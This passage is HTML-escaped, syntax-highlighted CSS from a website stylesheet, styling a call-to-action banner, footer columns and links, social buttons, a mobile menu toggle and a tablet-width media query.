&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background: linear-gradient&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;to right, var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--primary&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--secondary&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-align: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 6rem 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More padding */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .cta h2 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 3rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Larger heading */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1.8rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .cta p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.3rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 2.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            max-width: 700px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-left: auto&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-right: auto&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .cta .btn &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--primary&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .cta .btn:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        footer &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--dark&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 4rem &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More padding */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-content &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: grid&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            grid-template-columns: repeat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4, 1fr&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            gap: 2.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More gap */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 2.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-column h3 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.4rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1.8rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            position: relative&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding-bottom: 12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-column h3::after &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            content: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            position: absolute&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            bottom: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            left: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 50px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Wider underline */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: 3px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Thicker underline */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-column p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1.2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-links &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            list-style: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-links li &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-links li a &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--light&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-decoration: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: all 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .footer-links li a:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding-left: 8px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More pronounced slide effect */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .social-links &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: flex&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            gap: 1.2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-top: 1.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .social-links a &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: inline-flex&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            align-items: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            justify-content: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 50px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Larger social buttons */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: 50px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255, 255, 255, 0.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly more visible background */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-radius: 8px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Square with rounded corners */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-decoration: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-weight: 600&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: all 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 0.9rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .social-links a:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transform: translateY&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-7px&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More pronounced lift */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .copyright &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-align: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding-top: 2.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-top: 1px solid rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255, 255, 255, 0.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .mobile-menu &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            cursor: pointer&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 0.5rem 1rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border: 1px solid rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255, 255, 255, 0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-radius: 5px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: all 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .mobile-menu:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255, 255, 255, 0.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        @media &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;max-width: 992px&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .about-content &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                grid-template-columns: 1fr&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .initiatives-grid &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                grid-template-columns: repeat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2, 1fr&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .footer-content &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                grid-template-columns: repeat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2, 1fr&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
